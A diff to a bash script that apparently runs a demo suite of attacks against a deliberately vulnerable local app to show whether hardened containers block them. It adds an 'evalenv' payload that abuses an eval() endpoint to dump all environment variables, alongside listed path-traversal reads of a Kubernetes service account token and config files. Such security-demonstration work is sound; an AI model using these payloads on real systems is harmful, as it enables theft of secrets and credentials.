@@ -24,7 +24,8 @@ Usage: $0 <target> [attack names...]
     token    Path Traversal -> Kubernetes service account token
     conf     Path Traversal -> planted /etc/come-to-code.conf (AppArmor blacklist gap)
     supertoken  Path Traversal -> come-to-code-supersecure-token (easter egg, ASCII art)
-    eval     Arbitrary Code Execution via eval()
+    eval     Arbitrary Code Execution via eval()  (code=1+1)
+    evalenv  eval escalation: dumps process.env (secrets) — no shell
 
   Examples:
     $0 app-distroless
@@ -117,6 +118,14 @@ attack_eval() {
       "Executes arbitrary JavaScript through eval() (no shell required)." \
       -G "http://localhost:${PORT}/attack/eval-rce" --data-urlencode "code=1+1"
 }
+attack_evalenv() {
+  # curl equivalent:
+  #   curl -G "http://localhost:${PORT}/attack/eval-rce" --data-urlencode "code=process.env"
+  # The escalation of [eval]: pure-JS payload, no shell — dumps every env var (often secrets/API keys).
+  run "eval escalation -> process.env  [evalenv]  (/attack/eval-rce)" \
+      "Same eval(), scarier payload: dumps all environment variables (no shell)." \
+      -G "http://localhost:${PORT}/attack/eval-rce" --data-urlencode "code=process.env"
+}
 
 echo -e "${BOLD}=== Attacks against '${TARGET}' (port ${PORT}) ===${NC}"
 echo -e "Legend: ${RED}${BOLD}RED = attack succeeded${NC} | ${GREEN}${BOLD}GREEN = attack blocked${NC}"
@@ -129,7 +138,8 @@ for name in "${SELECTION[@]}"; do
     conf)   attack_conf ;;
     supertoken) attack_supertoken ;;
     eval)   attack_eval ;;
-    *) echo -e "\n${YELLOW}Skipping unknown attack '$name' (valid: cmdi passwd token conf supertoken eval)${NC}" ;;
+    evalenv) attack_evalenv ;;
+    *) echo -e "\n${YELLOW}Skipping unknown attack '$name' (valid: cmdi passwd token conf supertoken eval evalenv)${NC}" ;;
   esac
 done
 
